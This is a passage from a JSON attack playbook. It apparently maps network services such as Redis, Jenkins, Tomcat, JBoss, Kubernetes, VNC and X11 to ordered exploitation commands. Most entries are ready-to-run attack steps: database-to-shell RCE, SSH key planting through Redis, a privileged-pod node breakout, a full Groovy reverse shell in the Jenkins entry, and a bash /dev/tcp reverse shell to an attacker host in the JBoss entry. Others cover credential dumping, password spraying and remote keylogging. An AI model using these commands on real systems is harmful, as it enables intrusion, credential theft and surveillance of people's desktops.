    "cmd": "PGPASSWORD='<PASS>' psql -h <TARGET_IP> -U <USER> -d postgres -c \"DROP TABLE IF EXISTS c; CREATE TABLE c(o text); COPY c FROM PROGRAM 'id'; SELECT * FROM c;\"",
    "when": "if user is superuser (CVE-2019-9193)",
    "yields": [
     "shell"
    ]
   },
   {
    "phase": "loot",
    "label": "Arbitrary file read via large objects",
    "cmd": "PGPASSWORD='<PASS>' psql -h <TARGET_IP> -U <USER> -d postgres -c \"SELECT lo_import('/etc/passwd', 1337); SELECT convert_from(lo_get(1337),'UTF8');\"",
    "when": "if user is superuser",
    "yields": [
     "file-read"
    ]
   }
  ]
 },
 {
  "ports": [
   5672,
   5671,
   15672,
   15671,
   25672
  ],
  "service": "rabbitmq",
  "aliases": [
   "amqp",
   "rabbitmq",
   "amqps"
  ],
  "proto": "tcp",
  "risk": "medium",
  "note": "The win is rarely RCE on the broker itself but the guest:guest default (or weak admin) on the 15672 management console, whose /api/definitions dumps every user, vhost and often plaintext passwords in queued messages for reuse elsewhere, and whose 25672 cluster port shares the Erlang cookie that turns epmd into RCE.",
  "categories": [
   "service-exploitation",
   "web-exploitation",
   "password-ops",
   "recon"
  ],
  "attack": [
   "T1190",
   "T1078",
   "T1552.001",
   "T1046"
  ],
  "keywords": [
   "rabbitmq",
   "amqp",
   "guest:guest",
   "15672",
   "rabbitmqadmin",
   "amqp-info",
   "api/definitions"
  ],
  "yields": [
   "creds",
   "users"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Probe broker + management API",
    "cmd": "nmap -p5672,15672 -sCV --script amqp-info <TARGET_IP> -oN nmap_rabbitmq.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Hit management overview with default creds",
    "cmd": "curl -s -u guest:guest http://<TARGET_IP>:15672/api/overview | jq .",
    "when": "always",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "loot",
    "label": "Dump definitions (users, vhosts, message creds)",
    "cmd": "curl -s -u guest:guest http://<TARGET_IP>:15672/api/definitions | jq .",
    "when": "if console auth succeeds",
    "yields": [
     "creds",
     "users"
    ]
   },
   {
    "phase": "loot",
    "label": "Drain queued messages for secrets",
    "cmd": "rabbitmqadmin -H <TARGET_IP> -u guest -p guest get queue=QUEUE count=50 requeue=true",
    "when": "if queues present",
    "yields": [
     "creds",
     "source-code"
    ]
   },
   {
    "phase": "lateral",
    "label": "Spray recovered creds across SMB/WinRM",
    "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --continue-on-success",
    "when": "if creds recovered",
    "yields": [
     "foothold"
    ]
   }
  ]
 },
 {
  "ports": [
   5683,
   5684
  ],
  "service": "coap",
  "aliases": [
   "coap",
   "coaps"
  ],
  "proto": "udp",
  "risk": "medium",
  "note": "CoAP is a REST-like IoT protocol over UDP; `GET /.well-known/core` returns the full resource list, and those resources are frequently readable/writable without auth, exposing sensor data, device config and command endpoints the same way an unauthenticated web API would.",
  "categories": [
   "recon",
   "service-exploitation",
   "file-ops"
  ],
  "attack": [
   "T1046",
   "T1190",
   "T1213"
  ],
  "keywords": [
   "coap-client",
   "aiocoap",
   "libcoap",
   "nmap coap"
  ],
  "yields": [
   "file-read",
   "foothold"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Discover the well-known resource list",
    "cmd": "coap-client -m get coap://<TARGET_IP>/.well-known/core",
    "when": "always",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "enum",
    "label": "Read a specific resource",
    "cmd": "coap-client -m get coap://<TARGET_IP>/sensors/temp",
    "when": "if resource path known",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "foothold",
    "label": "Write to a resource to change device state",
    "cmd": "coap-client -m put coap://<TARGET_IP>/actuator -e 'on'",
    "when": "if resource writable",
    "yields": [
     "foothold"
    ]
   }
  ]
 },
 {
  "ports": [
   5900,
   5901,
   5902,
   5903
  ],
  "service": "vnc",
  "aliases": [
   "vnc",
   "vnc-1",
   "vnc-2",
   "vnc-3",
   "rfb"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "VNC often ships with no password or an 8-character-truncated one that cracks instantly, and a looted .vnc/passwd file is reversibly encrypted with a fixed DES key.",
  "categories": [
   "password-ops",
   "service-exploitation",
   "post-exploitation-win",
   "initial-foothold"
  ],
  "attack": [
   "T1021.005",
   "T1110.001",
   "T1078"
  ],
  "keywords": [
   "vncviewer",
   "hydra vnc",
   "vnc_none_auth",
   "vncpwd",
   "vnc-info",
   "realvnc-auth-bypass"
  ],
  "yields": [
   "foothold",
   "shell",
   "creds"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Auth type, version and known bypasses",
    "cmd": "nmap -sV -p<PORT> --script vnc-info,vnc-title,realvnc-auth-bypass <TARGET_IP>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Check for unauthenticated (None) access",
    "cmd": "msfconsole -q -x \"use auxiliary/scanner/vnc/vnc_none_auth; set RHOSTS <TARGET_IP>; set RPORT <PORT>; run; exit\"",
    "when": "always",
    "yields": [
     "foothold"
    ]
   },
   {
    "phase": "foothold",
    "label": "Connect to an open/no-auth desktop",
    "cmd": "vncviewer <TARGET_IP>::<PORT>",
    "when": "if anonymous/None auth allowed",
    "yields": [
     "shell",
     "foothold"
    ]
   },
   {
    "phase": "foothold",
    "label": "Brute force the VNC password",
    "cmd": "hydra -P /usr/share/wordlists/rockyou.txt vnc://<TARGET_IP>:<PORT>",
    "when": "if VNC auth is required",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "foothold",
    "label": "Connect with the recovered password",
    "cmd": "vncviewer <TARGET_IP>::<PORT>",
    "when": "if creds known",
    "yields": [
     "shell",
     "foothold"
    ]
   },
   {
    "phase": "loot",
    "label": "Decrypt a looted .vnc/passwd (fixed DES key)",
    "cmd": "vncpwd passwd",
    "when": "if a .vnc/passwd file or VNC registry blob was recovered",
    "yields": [
     "creds"
    ]
   }
  ]
 },
 {
  "ports": [
   5984,
   6984
  ],
  "service": "couchdb",
  "aliases": [
   "couchdb",
   "httpd"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "Older CouchDB chains the auth-bypass CVE-2017-12635 (create an admin via a JSON role-type confusion) into CVE-2017-12636 (set a malicious query_server) for straight RCE.",
  "categories": [
   "service-exploitation",
   "web-exploitation",
   "recon",
   "metasploit"
  ],
  "attack": [
   "T1046",
   "T1190",
   "T1210"
  ],
  "keywords": [
   "couchdb",
   "_all_dbs",
   "_users",
   "_config",
   "cve-2017-12635",
   "cve-2017-12636",
   "query_server",
   "apache_couchdb_cmd_exec"
  ],
  "yields": [
   "admin",
   "shell",
   "creds"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "List databases over the HTTP API",
    "cmd": "curl -s http://<TARGET_IP>:5984/_all_dbs",
    "when": "always",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "enum",
    "label": "Check version and config",
    "cmd": "curl -s http://<TARGET_IP>:5984/",
    "when": "always",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Create admin via auth-bypass",
    "cmd": "curl -s -X PUT http://<TARGET_IP>:5984/_users/org.couchdb.user:hacker -H 'Content-Type: application/json' -d '{\"type\":\"user\",\"name\":\"hacker\",\"roles\":[\"_admin\"],\"roles\":[],\"password\":\"<PASS>\"}'",
    "when": "if version vulnerable to CVE-2017-12635",
    "yields": [
     "admin"
    ]
   },
   {
    "phase": "foothold",
    "label": "Reliable RCE via metasploit (query_server)",
    "cmd": "msfconsole -q -x \"use exploit/linux/http/apache_couchdb_cmd_exec; set RHOSTS <TARGET_IP>; set LHOST <ATTACKER_IP>; set LPORT <LPORT>; run\"",
    "when": "if authenticated as admin and version vulnerable to CVE-2017-12636",
    "yields": [
     "shell"
    ]
   },
   {
    "phase": "loot",
    "label": "Read documents for secrets",
    "cmd": "curl -s 'http://<USER>:<PASS>@<TARGET_IP>:5984/_all_dbs' && curl -s 'http://<USER>:<PASS>@<TARGET_IP>:5984/DBNAME/_all_docs?include_docs=true'",
    "when": "if access obtained",
    "yields": [
     "creds"
    ]
   }
  ]
 },
 {
  "ports": [
   5985,
   5986,
   47001
  ],
  "service": "winrm",
  "aliases": [
   "wsman",
   "winrm",
   "ssl/wsman",
   "http",
   "wsmans",
   "ssl/http"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "WinRM is the cleanest Windows foothold once you hold creds or an NT hash - evil-winrm gives a full PowerShell session and is often less monitored than RDP; the account only needs Remote Management Users membership.",
  "categories": [
   "netexec",
   "powershell-pentest",
   "lateral-move",
   "post-exploitation-win",
   "initial-foothold"
  ],
  "attack": [
   "T1021.006",
   "T1078",
   "T1550.002",
   "T1059.001"
  ],
  "keywords": [
   "evil-winrm",
   "nxc winrm",
   "winrm",
   "wsman"
  ],
  "yields": [
   "shell",
   "foothold",
   "admin"
  ],
  "needs": [
   "creds"
  ],
  "steps": [
   {
    "phase": "recon",
    "label": "Confirm the WinRM listener",
    "cmd": "nmap -sV -p<PORT> <TARGET_IP>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Validate creds and check for Pwn3d!",
    "cmd": "nxc winrm <TARGET_IP> -u <USER> -p '<PASS>'",
    "when": "if creds known",
    "yields": [
     "foothold"
    ]
   },
   {
    "phase": "enum",
    "label": "Spray a credential set across users",
    "cmd": "nxc winrm <TARGET_IP> -u users.txt -p '<PASS>' --continue-on-success",
    "when": "if a shared/leaked password is known",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "foothold",
    "label": "Interactive PowerShell session (password)",
    "cmd": "evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>'",
    "when": "if creds valid for WinRM",
    "yields": [
     "shell",
     "foothold"
    ]
   },
   {
    "phase": "foothold",
    "label": "Pass-the-hash session",
    "cmd": "evil-winrm -i <TARGET_IP> -u <USER> -H <HASH>",
    "when": "if NT hash is held",
    "yields": [
     "shell",
     "foothold"
    ]
   },
   {
    "phase": "foothold",
    "label": "Session over TLS (5986)",
    "cmd": "evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>' -S",
    "when": "if 5986/https is the open port",
    "yields": [
     "shell"
    ]
   },
   {
    "phase": "lateral",
    "label": "One-shot command without a full session",
    "cmd": "nxc winrm <TARGET_IP> -u <USER> -H <HASH> -x \"whoami /all\"",
    "when": "if only command execution is needed",
    "yields": []
   }
  ]
 },
 {
  "ports": [
   6000,
   6001,
   6002,
   6003,
   6004,
   6005
  ],
  "service": "x11",
  "aliases": [
   "x11",
   "x11-1"
  ],
  "proto": "tcp",
  "risk": "medium",
  "note": "An X server left open to the network (xhost +) needs no auth: you can screenshot the victim's live desktop and log every keystroke, often grabbing a password as the user types it. Classic on older Unix/appliance boxes.",
  "categories": [
   "service-exploitation",
   "post-exploitation-linux",
   "recon"
  ],
  "attack": [
   "T1021",
   "T1113",
   "T1056.001",
   "T1046",
   "T1552"
  ],
  "keywords": [
   "xwd",
   "xspy",
   "xdpyinfo",
   "x11-access",
   "x11",
   "open_x11",
   "xwininfo",
   "nmap x11"
  ],
  "yields": [
   "creds",
   "file-read"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Check whether the X server grants access",
    "cmd": "nmap -p6000-6005 --script x11-access <TARGET_IP> -oN nmap_x11.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Confirm you can attach to the display",
    "cmd": "xdpyinfo -display <TARGET_IP>:0",
    "when": "if access-control disabled",
    "yields": []
   },
   {
    "phase": "loot",
    "label": "Screenshot the remote desktop",
    "cmd": "xwd -root -display <TARGET_IP>:0 -out screen.xwd && convert screen.xwd screen.png",
    "when": "if access-control disabled",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "loot",
    "label": "Keylog the session",
    "cmd": "xspy <TARGET_IP>:0",
    "when": "if access-control disabled",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "enum",
    "label": "Validate open X11 with Metasploit",
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/x11/open_x11; set RHOSTS <TARGET_IP>; run; exit'",
    "when": "always",
    "yields": []
   }
  ]
 },
 {
  "ports": [
   6379,
   6380
  ],
  "service": "redis",
  "aliases": [
   "redis"
  ],
  "proto": "tcp",
  "risk": "critical",
  "note": "Unauthenticated Redis running as a privileged user is near-instant RCE: abuse CONFIG SET dir/dbfilename to drop an SSH authorized_key, a cron job, or a webshell, or load a malicious module.",
  "categories": [
   "service-exploitation",
   "initial-foothold",
   "linux-escalation",
   "metasploit"
  ],
  "attack": [
   "T1046",
   "T1210",
   "T1098.004",
   "T1059"
  ],
  "keywords": [
   "redis-cli",
   "redis-info",
   "config get dir",
   "config set",
   "dbfilename",
   "module load",
   "authorized_keys",
   "redis_login"
  ],
  "yields": [
   "shell",
   "foothold",
   "file-read"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Grab server info",
    "cmd": "nmap -sV -p6379 --script=redis-info <TARGET_IP>",
    "when": "always",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "foothold",
    "label": "Connect and confirm unauth access",
    "cmd": "redis-cli -h <TARGET_IP> INFO server",
    "when": "if no auth required",
    "yields": [
     "foothold"
    ]
   },
   {
    "phase": "foothold",
    "label": "Authenticate when a password is set",
    "cmd": "redis-cli -h <TARGET_IP> -a '<PASS>' INFO",
    "when": "if creds known",
    "yields": [
     "foothold"
    ]
   },
   {
    "phase": "enum",
    "label": "Check writable dir for file drop",
    "cmd": "redis-cli -h <TARGET_IP> CONFIG GET dir",
    "when": "if access obtained",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Write SSH key for shell",
    "cmd": "redis-cli -h <TARGET_IP> CONFIG SET dir /root/.ssh/; redis-cli -h <TARGET_IP> CONFIG SET dbfilename authorized_keys; redis-cli -h <TARGET_IP> -x SET pwn < id_rsa.pub.padded; redis-cli -h <TARGET_IP> SAVE",
    "when": "if redis runs as root and ~/.ssh writable",
    "yields": [
     "shell"
    ]
   },
   {
    "phase": "foothold",
    "label": "RCE via malicious module (RedisModules-ExecuteCommand)",
    "cmd": "redis-cli -h <TARGET_IP> MODULE LOAD /tmp/module.so",
    "when": "if you can upload a .so and module loading allowed",
    "yields": [
     "shell"
    ]
   }
  ]
 },
 {
  "ports": [
   6443,
   8443
  ],
  "service": "kubernetes-api",
  "aliases": [
   "sun-sr-https",
   "sun-answerbook",
   "https-alt",
   "kube-apiserver",
   "pcsync-https"
  ],
  "proto": "tcp",
  "risk": "critical",
  "note": "A leaked ServiceAccount token or an anonymous RBAC binding is the entire cluster — run `auth can-i --list` first, and if you can create pods you own every node via a privileged hostPID pod and nsenter.",
  "categories": [
   "k8s-security",
   "k8s-ops",
   "container-cloud",
   "secrets-mgmt"
  ],
  "attack": [
   "T1552.007",
   "T1613",
   "T1610",
   "T1611",
   "T1078.004"
  ],
  "keywords": [
   "kubectl",
   "auth can-i",
   "curl 6443",
   "/api/v1",
   "kube-hunter",
   "serviceaccount token",
   "--insecure-skip-tls-verify"
  ],
  "yields": [
   "shell",
   "admin",
   "creds",
   "domain-user"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Confirm API server and read version",
    "cmd": "curl -sk --max-time 5 https://<TARGET_IP>:6443/version",
    "when": "always",
    "yields": []
   },
   {
    "phase": "recon",
    "label": "Scan for misconfigurations with kube-hunter",
    "cmd": "kube-hunter --remote <TARGET_IP>",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Check anonymous permissions",
    "cmd": "kubectl --server=https://<TARGET_IP>:6443 --insecure-skip-tls-verify auth can-i --list",
    "when": "if anonymous allowed",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Enumerate permissions with a stolen token",
    "cmd": "export TOKEN=$(cat sa-token.jwt); kubectl --server=https://<TARGET_IP>:6443 --insecure-skip-tls-verify --token=$TOKEN auth can-i --list",
    "when": "if token recovered",
    "yields": []
   },
   {
    "phase": "loot",
    "label": "Decode all cluster secrets",
    "cmd": "kubectl --server=https://<TARGET_IP>:6443 --insecure-skip-tls-verify --token=$TOKEN get secrets -A -o json | jq -r '.items[] | .metadata.namespace+\"/\"+.metadata.name, (.data // {} | to_entries[] | \"  \"+.key+\": \"+(.value|@base64d))'",
    "when": "if token can list secrets",
    "yields": [
     "creds",
     "hashes"
    ]
   },
   {
    "phase": "privesc",
    "label": "Break out to a node with a privileged pod",
    "cmd": "kubectl --server=https://<TARGET_IP>:6443 --insecure-skip-tls-verify --token=$TOKEN run hostpwn -it --rm --image=alpine --overrides='{\"spec\":{\"hostPID\":true,\"containers\":[{\"name\":\"x\",\"image\":\"alpine\",\"stdin\":true,\"tty\":true,\"securityContext\":{\"privileged\":true},\"command\":[\"nsenter\",\"--target\",\"1\",\"--mount\",\"--uts\",\"--ipc\",\"--net\",\"--pid\",\"--\",\"bash\"]}]}}'",
    "when": "if token can create pods",
    "yields": [
     "shell",
     "admin"
    ]
   }
  ]
 },
 {
  "ports": [
   7001,
   7002
  ],
  "service": "weblogic",
  "aliases": [
   "http",
   "ssl/http",
   "afs3-callback",
   "weblogic",
   "oracle-weblogic",
   "t3",
   "weblogicserver"
  ],
  "proto": "tcp",
  "risk": "critical",
  "note": "Oracle WebLogic on 7001 is a deserialization goldmine — the console-path auth bypass + RCE chain (CVE-2020-14882/14883) and the T3/XMLDecoder bugs give unauthenticated root-level RCE on unpatched boxes.",
  "categories": [
   "web-exploitation",
   "service-exploitation",
   "vuln-assessment",
   "metasploit",
   "initial-foothold"
  ],
  "attack": [
   "T1190",
   "T1210",
   "T1059"
  ],
  "keywords": [
   "weblogic",
   "console.portal",
   "cve-2020-14882",
   "cve-2019-2725",
   "nuclei weblogic",
   "metasploit weblogic",
   "t3",
   "cve-2017-10271",
   "wls-wsat",
   "weblogicscan"
  ],
  "yields": [
   "shell",
   "foothold"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Confirm WebLogic console",
    "cmd": "curl -sik http://<TARGET_IP>:7001/console/login/LoginForm.jsp | grep -i 'WebLogic\\|version'",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Scan for WebLogic deser CVEs",
    "cmd": "nuclei -u http://<TARGET_IP>:7001 -tags weblogic,oracle -severity high,critical",
    "when": "always",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Console auth-bypass path (CVE-2020-14882)",
    "cmd": "curl -s 'http://<TARGET_IP>:7001/console/css/%252e%252e%252fconsole.portal' -o /dev/null -w '%{http_code}\\n'",
    "when": "if unpatched 10.3.6 / 12.2.x",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Metasploit deserialization RCE",
    "cmd": "msfconsole -q -x 'use exploit/multi/misc/weblogic_deserialize_asyncresponseservice; set RHOSTS <TARGET_IP>; set RPORT 7001; set LHOST <LHOST>; set LPORT <LPORT>; run'",
    "when": "if nuclei flags CVE-2019-2725 / async deser",
    "yields": [
     "shell",
     "foothold"
    ]
   }
  ]
 },
 {
  "ports": [
   8009
  ],
  "service": "ajp",
  "aliases": [
   "ajp13",
   "ajp",
   "apache-jserv"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "AJP trusts whatever the front end claims, so Ghostcat (CVE-2020-1938) reads any file under the webapp root (WEB-INF/web.xml, tomcat-users.xml) even when 8080 is locked behind auth, and flips to RCE the moment the app lets you upload a file to include as a JSP.",
  "categories": [
   "service-exploitation",
   "web-exploitation",
   "metasploit",
   "vuln-assessment"
  ],
  "attack": [
   "T1190",
   "T1083",
   "T1552.001",
   "T1210"
  ],
  "keywords": [
   "ajpshooter",
   "ghostcat",
   "tomcat_ghostcat",
   "ajp-methods",
   "cve-2020-1938",
   "ajp-request"
  ],
  "yields": [
   "file-read",
   "creds",
   "source-code",
   "foothold"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Confirm AJP and probe methods",
    "cmd": "nmap -p8009 -sCV --script ajp-methods,ajp-headers,ajp-request <TARGET_IP> -oN nmap_ajp.txt",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Ghostcat read web.xml",
    "cmd": "python3 ajpShooter.py http://<TARGET_IP>:8080 8009 /WEB-INF/web.xml read",
    "when": "always",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "enum",
    "label": "Ghostcat via metasploit",
    "cmd": "msfconsole -q -x 'use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS <TARGET_IP>; set RPORT 8009; set FILENAME /WEB-INF/web.xml; run; exit'",
    "when": "if ajpShooter unavailable",
    "yields": [
     "file-read"
    ]
   },
   {
    "phase": "loot",
    "label": "Pull tomcat-users.xml for manager creds",
    "cmd": "python3 ajpShooter.py http://<TARGET_IP>:8080 8009 /WEB-INF/../../conf/tomcat-users.xml read",
    "when": "if Ghostcat file read works",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "foothold",
    "label": "Ghostcat file-read to RCE via uploaded JSP",
    "cmd": "python3 ajpShooter.py http://<TARGET_IP>:8080 8009 /uploads/shell.txt eval",
    "when": "if app allows file upload",
    "yields": [
     "shell",
     "foothold"
    ]
   }
  ]
 },
 {
  "ports": [
   8080,
   9990,
   4447,
   1090
  ],
  "service": "jboss",
  "aliases": [
   "jboss",
   "wildfly",
   "jmx-console",
   "jbossweb"
  ],
  "proto": "tcp",
  "risk": "critical",
  "note": "Legacy JBoss exposes the JMXInvokerServlet and jmx-console (frequently admin/admin or no auth) which let you deploy an arbitrary WAR or fire the CVE-2015-7501 Java deserialization: jexboss automates the whole path, so confirm the console then let it pick the vector.",
  "categories": [
   "service-exploitation",
   "web-exploitation",
   "metasploit",
   "exploit-dev"
  ],
  "attack": [
   "T1190",
   "T1210",
   "T1059",
   "T1505.003"
  ],
  "keywords": [
   "jboss",
   "jexboss",
   "jmx-console",
   "jmxinvokerservlet",
   "wildfly",
   "cve-2015-7501"
  ],
  "yields": [
   "shell",
   "foothold"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Enumerate JBoss entry points",
    "cmd": "curl -s -o /dev/null -w '%{http_code}\\n' http://<TARGET_IP>:8080/jmx-console/ ; curl -s -o /dev/null -w '%{http_code}\\n' http://<TARGET_IP>:8080/invoker/JMXInvokerServlet",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Automated vector detection",
    "cmd": "jexboss -host http://<TARGET_IP>:8080",
    "when": "always",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Deploy a WAR via jmx-console MainDeployer",
    "cmd": "msfconsole -q -x 'use exploit/multi/http/jboss_maindeployer; set RHOSTS <TARGET_IP>; set RPORT 8080; set LHOST <ATTACKER_IP>; set LPORT <LPORT>; run; exit'",
    "when": "if jmx-console accessible",
    "yields": [
     "shell",
     "foothold"
    ]
   },
   {
    "phase": "foothold",
    "label": "JMXInvokerServlet deserialization (CVE-2015-7501)",
    "cmd": "java -jar jexboss.jar -host http://<TARGET_IP>:8080 --jmxtomcat -cmd 'bash -i >& /dev/tcp/<ATTACKER_IP>/<LPORT> 0>&1'",
    "when": "if invoker endpoint present",
    "yields": [
     "shell",
     "foothold"
    ]
   }
  ]
 },
 {
  "ports": [
   8080,
   8443,
   50000
  ],
  "service": "jenkins",
  "aliases": [
   "http",
   "http-proxy",
   "ssl/http",
   "jetty",
   "jenkins",
   "http-alt",
   "webcache",
   "ibm-db2"
  ],
  "proto": "tcp",
  "risk": "critical",
  "note": "Jenkins is a top web-family shell: an authenticated Script Console (/script) is raw Groovy RCE as the Jenkins user, and unpatched LTS is vulnerable to the unauthenticated arbitrary file read CVE-2024-23897 that leaks secrets/creds to pivot into the console.",
  "categories": [
   "web-exploitation",
   "service-exploitation",
   "vuln-assessment",
   "initial-foothold",
   "metasploit"
  ],
  "attack": [
   "T1190",
   "T1210",
   "T1059",
   "T1552.001",
   "T1072"
  ],
  "keywords": [
   "jenkins",
   "script console",
   "jenkins-cli",
   "cve-2024-23897",
   "groovy",
   "nuclei jenkins",
   "x-jenkins",
   "/scripttext",
   "/script",
   "asynchpeople",
   "jenkins-cli.jar"
  ],
  "yields": [
   "file-read",
   "creds",
   "shell",
   "foothold"
  ],
  "needs": [
   "creds"
  ],
  "steps": [
   {
    "phase": "recon",
    "label": "Fingerprint version from the response header",
    "cmd": "curl -s -I http://<TARGET_IP>:8080/ | grep -i x-jenkins",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Enumerate users",
    "cmd": "curl -s http://<TARGET_IP>:8080/asynchPeople/api/json?pretty=true | jq -r '.users[].user.fullName'",
    "when": "always",
    "yields": [
     "users"
    ]
   },
   {
    "phase": "foothold",
    "label": "Command execution via the Script Console",
    "cmd": "curl -s -u '<USER>:<PASS>' --data-urlencode 'script=println \"id\".execute().text' http://<TARGET_IP>:8080/scriptText",
    "when": "if script console reachable",
    "yields": [
     "shell"
    ]
   },
   {
    "phase": "foothold",
    "label": "Groovy reverse shell",
    "cmd": "curl -s -u '<USER>:<PASS>' --data-urlencode 'script=String host=\"<LHOST>\";int port=<LPORT>;String cmd=\"/bin/bash\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();' http://<TARGET_IP>:8080/scriptText",
    "when": "if script console reachable",
    "yields": [
     "shell"
    ]
   },
   {
    "phase": "loot",
    "label": "Decrypt all stored credentials",
    "cmd": "curl -s -u '<USER>:<PASS>' --data-urlencode 'script=com.cloudbees.plugins.credentials.SystemCredentialsProvider.getInstance().getCredentials().forEach{c-> try{println(c.id+\" | \"+c.username+\":\"+c.password)}catch(e){println(c)}}' http://<TARGET_IP>:8080/scriptText",
    "when": "if script console reachable",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "foothold",
    "label": "Arbitrary file read via CLI (CVE-2024-23897)",
    "cmd": "java -jar jenkins-cli.jar -s http://<TARGET_IP>:8080/ -http connect-node '@/etc/passwd'",
    "when": "if version < 2.442 / LTS 2.426.3",
    "yields": [
     "file-read",
     "source-code"
    ]
   }
  ]
 },
 {
  "ports": [
   8080,
   8443
  ],
  "service": "tomcat",
  "aliases": [
   "http",
   "http-alt",
   "ssl/http",
   "apache-coyote",
   "apache tomcat",
   "tomcat",
   "coyote"
  ],
  "proto": "tcp",
  "risk": "critical",
  "note": "Tomcat is a near-guaranteed shell when the Manager app is reachable: brute the default creds (tomcat/tomcat, admin/admin, etc.), deploy a JSP WAR, and you are RCE as the Tomcat service user.",
  "categories": [
   "web-exploitation",
   "service-exploitation",
   "initial-foothold",
   "payload-craft",
   "metasploit"
  ],
  "attack": [
   "T1190",
   "T1110.001",
   "T1505.003",
   "T1059",
   "T1110"
  ],
  "keywords": [
   "tomcat",
   "manager/html",
   "manager/text",
   "msfvenom war",
   "hydra http-get",
   "curl -u",
   "jsp_shell",
   "manager",
   "tomcat_mgr_login",
   "tomcat_mgr_upload",
   "cve-2017-12617"
  ],
  "yields": [
   "shell",
   "foothold"
  ],
  "needs": [],
  "steps": [
   {
    "phase": "recon",
    "label": "Confirm Tomcat and version",
    "cmd": "curl -s http://<TARGET_IP>:<PORT>/docs/ | grep -i 'Apache Tomcat' ; whatweb http://<TARGET_IP>:<PORT>/",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Probe Manager / Host-Manager",
    "cmd": "curl -s -u tomcat:tomcat http://<TARGET_IP>:<PORT>/manager/html -o /dev/null -w '%{http_code}\\n'",
    "when": "always",
    "yields": []
   },
   {
    "phase": "enum",
    "label": "Brute Manager with default list",
    "cmd": "hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -s <PORT> <TARGET_IP> http-get /manager/html",
    "when": "if Manager returns 401 (not 404)",
    "yields": [
     "creds"
    ]
   },
   {
    "phase": "foothold",
    "label": "Build a JSP reverse-shell WAR",
    "cmd": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war",
    "when": "if creds known",
    "yields": []
   },
   {
    "phase": "foothold",
    "label": "Deploy WAR via Manager text API",
    "cmd": "curl -u <USER>:<PASS> -T shell.war 'http://<TARGET_IP>:<PORT>/manager/text/deploy?path=/shell&update=true'",
    "when": "if creds known",
    "yields": [
     "foothold"
    ]
   },
   {
    "phase": "foothold",
    "label": "Trigger the shell (catch on nc)",
    "cmd": "curl http://<TARGET_IP>:<PORT>/shell/",
    "when": "after deploy, with nc -lvnp <LPORT> running",
    "yields": [
     "shell"
    ]
   }
  ]
 },
 {
  "ports": [
   8089,
   8000
  ],
  "service": "splunk",
  "aliases": [
   "splunk",
   "splunkd",
   "splunk-mgmt"
  ],
  "proto": "tcp",
  "risk": "high",
  "note": "The 8089 management REST port accepts a custom app bundle, so with any valid credentials (or a Universal Forwarder's known/default login) you deploy a scripted input that runs as the Splunk service account, commonly SYSTEM on Windows, making it a reliable privilege-escalation and lateral path, not just a log viewer.",
  "categories": [
   "service-exploitation",
   "web-exploitation",
   "observability-sec",
   "post-exploitation-win"
  ],
  "attack": [
   "T1190",
   "T1059",
   "T1078",
   "T1569"
  ],
  "keywords": [
   "splunk",
   "8089",
   "splunkwhisperer",
   "pysplunkwhisperer2",
   "services/server/info"
  ],
  "yields": [
   "shell",
   "foothold",
   "admin"
  ],
  "needs": [
   "creds"
  ],
  "steps": [
   {
    "phase": "recon",
